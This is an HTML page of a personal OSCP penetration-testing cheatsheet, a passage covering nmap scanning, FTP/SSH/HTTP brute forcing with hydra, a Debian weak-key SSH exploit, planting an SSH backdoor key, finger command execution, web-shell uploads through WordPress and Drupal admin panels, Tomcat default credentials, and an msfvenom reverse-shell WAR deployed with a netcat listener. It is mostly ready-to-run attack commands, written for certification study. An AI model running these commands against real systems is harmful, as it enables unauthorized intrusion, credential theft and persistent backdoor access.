
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>OSCP personal cheatsheet</title>
	
	<meta name="description" content="OSCP personal cheatsheet">
	
	<meta name="author" content="Liodeus">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
  
	<!-- stylesheets -->ß
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">


	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/Liodeus">
				<i class="fa fa-github"></i>
			</a>
			
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:thibaultgalbourdin@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/94b2c0c075c4ed839beee2dafbb2ac69?s=35" class="img-circle" />
				Liodeus
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<!-- <li><a href="/">Categories</a></li> -->
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<!-- <li><a href="/"><i class="fa fa-folder"></i>Categories</a></li> -->
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="https://liodeus.github.io/assets/imgs/profile.png.ico" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">Liodeus</a>
    </h3>
</header>


<div id="bio" class="text-center">
	OSCP journey with Liodeus !
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/Liodeus">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/thibault-galbourdin-9a4998144">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:thibaultgalbourdin@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="https://www.hackthebox.eu/profile/26480">
				<i class="fa fa-stop" aria-hidden="true"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>OSCP personal cheatsheet </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   September 
	   18th,
	   
	   2020
	 </span>
	  <div class="article_body">
	  <ul>
  <li>
    <p><a href="#enumeration">Enumeration</a></p>
  </li>
  <li><a href="#nmap">NMAP</a>
    <ul>
      <li><a href="#tcp">TCP</a></li>
      <li><a href="#udp">UDP</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#ftp---21">FTP - 21</a></p>

    <ul>
      <li><a href="#brute-force">Brute force</a></li>
      <li><a href="#downloading-file">Downloading file</a></li>
      <li><a href="#uploading-file">Uploading file</a></li>
    </ul>
  </li>
  <li><a href="#ssh---22">SSH - 22</a>
    <ul>
      <li><a href="#brute-force-1">Brute force</a></li>
      <li><a href="#cve-2008-0166">CVE-2008-0166</a></li>
      <li><a href="#ssh-backdoor---post-exploitation">SSH backdoor - post exploitation</a></li>
    </ul>
  </li>
  <li><a href="#dns---53">DNS - 53</a>
    <ul>
      <li><a href="#zone-transfert">Zone transfert</a></li>
      <li><a href="#dns-brute-force">DNS brute force</a></li>
    </ul>
  </li>
  <li><a href="#finger---79">FINGER - 79</a>
    <ul>
      <li><a href="#user-enumeration">User enumeration</a></li>
      <li><a href="#command-execution">Command execution</a></li>
    </ul>
  </li>
  <li><a href="#http---https---80---443">HTTP - HTTPS - 80 - 443</a>
    <ul>
      <li><a href="#automatic-scanners">Automatic scanners</a></li>
      <li><a href="#wordpress">Wordpress</a>
        <ul>
          <li><a href="#wordpress-panel-rce">Wordpress panel RCE</a></li>
        </ul>
      </li>
      <li><a href="#drupal">Drupal</a>
        <ul>
          <li><a href="#username-enumeration">Username enumeration</a></li>
          <li><a href="#hidden-pages-enumeration">Hidden pages enumeration</a></li>
          <li><a href="#drupal-panel-rce">Drupal panel RCE</a></li>
        </ul>
      </li>
      <li><a href="#joomla">Joomla</a></li>
      <li><a href="#tomcat">Tomcat</a>
        <ul>
          <li><a href="#default-credentials">Default credentials</a></li>
          <li><a href="#brute-force-2">Brute force</a></li>
          <li><a href="#tomcat-panel-rce">Tomcat panel RCE</a></li>
        </ul>
      </li>
      <li><a href="#webdav">WebDav</a></li>
      <li><a href="#http-brute-force-authentication">HTTP brute force authentication</a>
        <ul>
          <li><a href="#http-basic-authentication">HTTP basic authentication</a></li>
          <li><a href="#http-get-request">HTTP GET request</a></li>
          <li><a href="#http-post-request">HTTP POST request</a></li>
        </ul>
      </li>
      <li><a href="#spidering--brute-force-directories--files">Spidering / Brute force directories / files</a>
        <ul>
          <li><a href="#file-backups">File backups</a></li>
        </ul>
      </li>
      <li><a href="#local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</a>
        <ul>
          <li><a href="#wrappers">Wrappers</a>
            <ul>
              <li><a href="#wrapper-phpfilter">Wrapper php://filter</a></li>
              <li><a href="#wrapper-expect">Wrapper expect://</a></li>
              <li><a href="#wrapper-data">Wrapper data://</a></li>
              <li><a href="#wrapper-input">Wrapper input://</a></li>
            </ul>
          </li>
          <li><a href="#useful-lfi-list">Useful LFI list</a></li>
          <li><a href="#tools">Tools</a></li>
        </ul>
      </li>
      <li><a href="#command-injection">Command injection</a></li>
      <li><a href="#deserialization">Deserialization</a></li>
      <li><a href="#file-upload">File upload</a></li>
      <li><a href="#sql-injection">SQL injection</a></li>
      <li><a href="#xss">XSS</a></li>
      <li><a href="#other-web-vulnerabilities">Other web vulnerabilities</a></li>
      <li><a href="#upload-a-file-with-put">Upload a file with PUT</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#kerberos---88">KERBEROS - 88</a></p>
  </li>
  <li><a href="#pop3---110">POP3 - 110</a>
    <ul>
      <li><a href="#brute-force-3">Brute force</a></li>
      <li><a href="#read-mail">Read mail</a></li>
    </ul>
  </li>
  <li><a href="#snmp---161">SNMP - 161</a>
    <ul>
      <li><a href="#brute-force-community-string">Brute force community string</a></li>
      <li><a href="#modifying-snmp-values">Modifying SNMP values</a></li>
    </ul>
  </li>
  <li><a href="#ldap---389">LDAP - 389</a>
    <ul>
      <li><a href="#scans">Scans</a></li>
      <li><a href="#graphical-interface">Graphical Interface</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#smb---445">SMB - 445</a></p>

    <ul>
      <li><a href="#version-if-nmap-didnt-detect-it">Version if nmap didn’t detect it</a></li>
      <li><a href="#scan-for-vulnerability">Scan for vulnerability</a></li>
      <li><a href="#manual-testing">Manual testing</a></li>
      <li><a href="#brute-force-4">Brute force</a></li>
      <li><a href="#mount-a-smb-share">Mount a SMB share</a></li>
      <li><a href="#get-a-shell">Get a shell</a></li>
      <li><a href="#EternalBlue-MS17-010">EternalBlue (MS17-010)</a>
        <ul>
          <li><a href="#check-if-vulnerable">Check if vulnerable</a></li>
          <li><a href="#prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</a></li>
          <li><a href="#exploit">Exploit</a></li>
          <li><a href="#if-this-doesnt-work-try-this-one">If this doesn’t work, try this one</a></li>
        </ul>
      </li>
      <li><a href="#ms08-067">MS08-067</a></li>
      <li><a href="#cve-2017-7494">CVE-2017-7494</a></li>
    </ul>
  </li>
  <li><a href="#mssql---1433">MSSQL - 1433</a>
    <ul>
      <li><a href="#get-information">Get information</a></li>
      <li><a href="#brute-force-5">Brute force</a></li>
      <li><a href="#having-credentials">Having credentials</a></li>
      <li><a href="#manual-exploit">Manual exploit</a></li>
    </ul>
  </li>
  <li><a href="#nfs---2049">NFS - 2049</a>
    <ul>
      <li><a href="#show-mountable-nfs-shares">Show Mountable NFS Shares</a></li>
      <li><a href="#mount-a-share">Mount a share</a></li>
      <li><a href="#nfs-misconfigurations">NFS misconfigurations</a></li>
    </ul>
  </li>
  <li><a href="#mysql---3306">MYSQL - 3306</a>
    <ul>
      <li><a href="#brute-force-6">Brute force</a></li>
      <li><a href="#extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</a></li>
      <li><a href="#connect">Connect</a></li>
      <li><a href="#mysql-commands">MySQL commands</a></li>
      <li><a href="#manual-exploit-1">Manual exploit</a></li>
    </ul>
  </li>
  <li><a href="#rdp---3389">RDP - 3389</a>
    <ul>
      <li><a href="#brute-force">Brute force</a></li>
      <li><a href="#connect-with-known-credentials--hash">Connect with known credentials / hash</a></li>
      <li><a href="#session-stealing">Session stealing</a>
        <ul>
          <li><a href="#get-openned-sessions">Get openned sessions</a></li>
          <li><a href="#access-to-the-selected">Access to the selected</a></li>
        </ul>
      </li>
      <li><a href="#adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</a></li>
    </ul>
  </li>
  <li><a href="#vnc---5800---58001---5900---5901">VNC - 5800 - 58001 - 5900 - 5901</a>
    <ul>
      <li><a href="#scans-1">Scans</a></li>
      <li><a href="#brute-force-8">Brute force</a></li>
      <li><a href="#connect-1">Connect</a></li>
      <li><a href="#found-vnc-password">Found VNC password</a>
        <ul>
          <li><a href="#linux">Linux</a></li>
          <li><a href="#windows">Windows</a></li>
        </ul>
      </li>
      <li><a href="#decrypt-vnc-password">Decrypt VNC password</a></li>
    </ul>
  </li>
  <li><a href="#winrm---5985---5986">WINRM - 5985 - 5986</a>
    <ul>
      <li><a href="#brute-force-9">Brute force</a></li>
      <li><a href="#connecting">Connecting</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#cgi">CGI</a></p>

    <ul>
      <li><a href="#found-cgi-scripts">Found CGI scripts</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#command-and-control-framework">Command and control framework</a></p>
  </li>
  <li>
    <p><a href="#compiling-exploits">Compiling exploits</a></p>

    <ul>
      <li><a href="#for-linux">For linux</a></li>
      <li><a href="#for-windows">For windows</a></li>
      <li><a href="#cross-compile">Cross compile</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#dictionary-generation">DICTIONARY GENERATION</a></p>
  </li>
  <li><a href="#file-transfer">FILE TRANSFER</a>
    <ul>
      <li><a href="#linux-1">Linux</a></li>
      <li><a href="#windows-1">Windows</a></li>
    </ul>
  </li>
  <li><a href="#git">GIT</a>
    <ul>
      <li><a href="#download-git">Download .git</a></li>
      <li><a href="#extract-git-content">Extract .git content</a></li>
    </ul>
  </li>
  <li><a href="#hashes">HASHES</a>
    <ul>
      <li><a href="#windows-2">Windows</a></li>
      <li><a href="#linux-2">Linux</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#mimikatz">MIMIKATZ</a></p>
  </li>
  <li>
    <p><a href="#miscellaneous">MISCELLANEOUS</a></p>

    <ul>
      <li><a href="#get-a-windows-path-without-spaces">Get a Windows path without spaces</a></li>
    </ul>
  </li>
  <li><a href="#msfvenom-payload">MSFVENOM PAYLOAD</a>
    <ul>
      <li><a href="#linux-3">Linux</a></li>
      <li><a href="#windows-3">Windows</a></li>
      <li><a href="#php">PHP</a></li>
      <li><a href="#asp">ASP</a></li>
      <li><a href="#jsp">JSP</a></li>
      <li><a href="#war">WAR</a></li>
      <li><a href="#python">Python</a></li>
      <li><a href="#bash">Bash</a></li>
      <li><a href="#perl">Perl</a></li>
      <li><a href="#listener">Listener</a>
        <ul>
          <li><a href="#metasploit">Metasploit</a></li>
          <li><a href="#netcat">Netcat</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#password-cracking">PASSWORD CRACKING</a>
    <ul>
      <li><a href="#online">Online</a></li>
      <li><a href="#hashcat">Hashcat</a>
        <ul>
          <li><a href="#linux-password">Linux password</a></li>
          <li><a href="#windows-password">Windows password</a></li>
          <li><a href="#others">Others</a></li>
          <li><a href="#rules">Rules</a></li>
        </ul>
      </li>
      <li><a href="#john">John</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#pivoting">PIVOTING</a></p>

    <ul>
      <li><a href="#sshuttle">Sshuttle</a></li>
      <li><a href="#proxychains">Proxychains</a></li>
    </ul>
  </li>
  <li><a href="#privile-escalation">PRIVILE ESCALATION</a>
    <ul>
      <li><a href="#linux-4">Linux</a>
        <ul>
          <li><a href="#enumeration-scripts">Enumeration scripts</a></li>
          <li><a href="#vulnerability-scan">Vulnerability scan</a></li>
          <li><a href="#suid-checker">Suid checker</a></li>
          <li><a href="#methodology-to-follow">Methodology to follow</a></li>
        </ul>
      </li>
      <li><a href="#windows-4">Windows</a>
        <ul>
          <li><a href="#enumeration-scripts-1">Enumeration scripts</a>
            <ul>
              <li><a href="#general-scans">General scans</a></li>
              <li><a href="#search-for-cve">Search for CVE</a></li>
              <li><a href="#post-exploitation">Post exploitation</a></li>
            </ul>
          </li>
          <li><a href="#juicypotato-seimpersonate-or-seassignprimarytoken">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</a></li>
          <li><a href="#methodology-to-follow-1">Methodology to follow</a></li>
          <li><a href="#autorun">Autorun</a>
            <ul>
              <li><a href="#detection">Detection</a></li>
              <li><a href="#exploitation">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a>
            <ul>
              <li><a href="#detection-1">Detection</a></li>
              <li><a href="#exploitation-1">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#executable-files">Executable Files</a>
            <ul>
              <li><a href="#detection-2">Detection</a></li>
              <li><a href="#exploitation-2">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#startup-applications">Startup applications</a>
            <ul>
              <li><a href="#detection-3">Detection</a></li>
              <li><a href="#exploitation-3">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#weak-service-permission">Weak service permission</a>
            <ul>
              <li><a href="#detection-4">Detection</a></li>
              <li><a href="#exploitation-4">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#unquoted-service-paths">Unquoted service paths</a>
            <ul>
              <li><a href="#detection-5">Detection</a></li>
              <li><a href="#exploitation-5">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#hot-potato">Hot potato</a>
            <ul>
              <li><a href="#exploitation-6">Exploitation</a></li>
            </ul>
          </li>
          <li><a href="#cve">CVE</a>
            <ul>
              <li><a href="#windows-xp">Windows XP</a></li>
              <li><a href="#windows-7">Windows 7</a></li>
              <li><a href="#windows-8">Windows 8</a></li>
              <li><a href="#windows-10">Windows 10</a></li>
              <li><a href="#windows-server-2003">Windows Server 2003</a></li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#proofs">PROOFS</a>
    <ul>
      <li><a href="#linux-5">Linux</a></li>
      <li><a href="#windows-5">Windows</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#reverse-shell">REVERSE SHELL</a></p>

    <ul>
      <li><a href="#amazing-tool-for-shell-generation">Amazing tool for shell generation</a></li>
      <li><a href="#bash-1">Bash</a></li>
      <li><a href="#perl-1">Perl</a></li>
      <li><a href="#python-1">Python</a></li>
      <li><a href="#netcat-1">Netcat</a></li>
      <li><a href="#more-reverse-shell">More reverse shell</a></li>
      <li><a href="#interactive-shell">Interactive shell</a></li>
      <li><a href="#adjust-interactive-shell">Adjust Interactive shell</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#shellshock">SHELLSHOCK</a></p>
  </li>
  <li><a href="#useful-linux-commands">USEFUL LINUX COMMANDS</a>
    <ul>
      <li><a href="#find-a-file">Find a file</a></li>
      <li><a href="#active-connection">Active connection</a></li>
      <li><a href="#list-all-suid-files">List all SUID files</a></li>
      <li><a href="#determine-the-current-version-of-linux">Determine the current version of Linux</a></li>
      <li><a href="#determine-more-information-about-the-environment">Determine more information about the environment</a></li>
      <li><a href="#list-processes-running">List processes running</a></li>
      <li><a href="#list-the-allowed-and-forbidden-commands-for-the-invoking-use">List the allowed (and forbidden) commands for the invoking use</a></li>
    </ul>
  </li>
  <li>
    <p><a href="#useful-windows-commands">USEFUL WINDOWS COMMANDS</a></p>
  </li>
  <li><a href="#zip">ZIP</a></li>
</ul>

<hr />

<h2 id="enumeration">Enumeration</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sn -v &lt;IP&gt;/CIDR
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmapAutomator &lt;IP&gt; All
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>autorecon &lt;IP&gt;/CIDR
</code></pre></div></div>

<hr />

<h2 id="nmap">NMAP</h2>

<h3 id="tcp">TCP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -sS -sC -sV -oA &lt;NAME&gt;.tcp &lt;IP&gt; -v
</code></pre></div></div>

<h3 id="udp">UDP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -sU -sS -sC -sV -oA &lt;NAME&gt;.udp &lt;IP&gt; -v
</code></pre></div></div>

<hr />

<h2 id="ftp---21">FTP - 21</h2>

<h3 id="brute-force">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ftp://&lt;IP&gt; -u -vV
</code></pre></div></div>

<h3 id="downloading-file">Downloading file</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt;
PASSIVE
BINARY
get &lt;FILE&gt;
</code></pre></div></div>

<h3 id="uploading-file">Uploading file</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt;
PASSIVE
BINARY
put &lt;FILE&gt;
</code></pre></div></div>

<hr />

<h2 id="ssh---22">SSH - 22</h2>

<h3 id="brute-force-1">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ssh://&lt;IP&gt; -u -vV
</code></pre></div></div>

<h3 id="cve-2008-0166">CVE-2008-0166</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
python 5720 dsa/1024 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
</code></pre></div></div>

<h3 id="ssh-backdoor---post-exploitation">SSH backdoor - post exploitation</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
ssh-keygen -f &lt;FILENAME&gt;
chmod 600 &lt;FILENAME&gt;
cat &lt;FILENAME&gt;.pub -&gt; copy

# Victim
echo &lt;FILENAME&gt;.pub &gt;&gt; &lt;PATH&gt;/.ssh/authorized_keys

# Connect
ssh -i &lt;FILENAME&gt; &lt;USER&gt;@&lt;IP&gt;
</code></pre></div></div>

<hr />

<h2 id="dns---53">DNS - 53</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum &lt;DOMAIN&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsrecon -d &lt;DOMAIN&gt;
</code></pre></div></div>

<h3 id="zone-transfert">Zone transfert</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsrecon -d &lt;DOMAIN&gt; -a
dig axfr &lt;DOMAIN&gt; @ns1.test.com
</code></pre></div></div>

<h3 id="dns-brute-force">DNS brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/blark/aiodnsbrute
</code></pre></div></div>

<hr />

<h2 id="finger---79">FINGER - 79</h2>

<h3 id="user-enumeration">User enumeration</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>finger @&lt;IP&gt;
finger &lt;USER&gt;@&lt;IP&gt;
</code></pre></div></div>

<h3 id="command-execution">Command execution</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>finger "|/bin/id@&lt;IP&gt;"
finger "|/bin/ls -a /&lt;IP&gt;"
</code></pre></div></div>

<hr />

<h2 id="http---https---80---443">HTTP - HTTPS - 80 - 443</h2>

<h3 id="automatic-scanners">Automatic scanners</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h &lt;URL&gt;
python crawleet.py -u &lt;URL&gt; -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
</code></pre></div></div>

<h3 id="wordpress">Wordpress</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Scan
wpscan --rua -e --url &lt;URL&gt;

# Brute force user(s)
wpscan --rua --url &lt;URL&gt; -P &lt;PASSWORDS_LIST&gt; -U "&lt;USER&gt;,&lt;USER&gt;"
</code></pre></div></div>

<h4 id="wordpress-panel-rce">Wordpress panel RCE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Modifying a php from the theme used (admin credentials needed)

Appearance -&gt; Editor -&gt; 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://&lt;IP&gt;/wp-content/themes/twentytwelve/404.php
</code></pre></div></div>

<h3 id="drupal">Drupal</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan -u &lt;URL&gt;
</code></pre></div></div>

<h4 id="username-enumeration">Username enumeration</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/&lt;number&gt; you can see the number of existing users :
	- /user/1 -&gt; Access denied (user exist)
	- /user/2 -&gt; Page not found (user doesn't exist)
</code></pre></div></div>

<h4 id="hidden-pages-enumeration">Hidden pages enumeration</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 &lt;URL&gt;/node/FUZZ
</code></pre></div></div>

<h4 id="drupal-panel-rce">Drupal panel RCE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -&gt; (Check) PHP Filter  -&gt; Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select Preview
</code></pre></div></div>

<h3 id="joomla">Joomla</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan -u &lt;URL&gt;
./joomlavs.rb --url &lt;URL&gt; -a -v
</code></pre></div></div>

<h3 id="tomcat">Tomcat</h3>

<h4 id="default-credentials">Default credentials</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:&lt;NOTHING&gt;
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
</code></pre></div></div>

<h4 id="brute-force-2">Brute force</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; http-get /manager/html -vV -u
</code></pre></div></div>

<h4 id="tomcat-panel-rce">Tomcat panel RCE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war

# Upload payload
Tomcat6 :
wget 'http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell' -O -

Tomcat7 and above :
curl -v -u &lt;USER&gt;:&lt;PASSWORD&gt; -T shell.war 'http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true'

# Listener
nc -lvp &lt;PORT&gt;

# Execute payload
curl http://&lt;IP&gt;:8080/shell/
</code></pre></div></div>

<h3 id="webdav">WebDav</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>davtest -url &lt;URL&gt;
</code></pre></div></div>

<h3 id="http-brute-force-authentication">HTTP brute force authentication</h3>

<h4 id="http-basic-authentication">HTTP basic authentication</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Hydra
hydra -l &lt;USER&gt; -V -P &lt;PASSWORDS_LIST&gt; -s 80 -f &lt;IP&gt; http-get /&lt;URL_ENDPOINT&gt;/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=&lt;URL&gt; user_pass=FILE0 0=&lt;USER:PASSWORD_LIST&gt; -x ignore:code=401 -x ignore:code=307
</code></pre></div></div>

<h4 id="http-get-request">HTTP GET request</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra &lt;IP&gt; -V -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t &lt;THREADS_NUMBER&gt;
</code></pre></div></div>

<h4 id="http-post-request">HTTP POST request</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t &lt;THREADS_NUMBER&gt;
</code></pre></div></div>

<h3 id="spidering--brute-force-directories--files">Spidering / Brute force directories / files</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gospider -d &lt;DEPTHS&gt; --robots --sitemap -t &lt;THREADS&gt; -s &lt;URL&gt;

ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/FUZZ -e .php,.txt -t &lt;THREADS&gt;
dirbuster

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</code></pre></div></div>

<h4 id="file-backups">File backups</h4>

<p>Once you have found all the files, look for backups of all the executable files (“<em>.php</em>”, “<em>.aspx</em>“…). Common variations for naming a backup are</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
</code></pre></div></div>

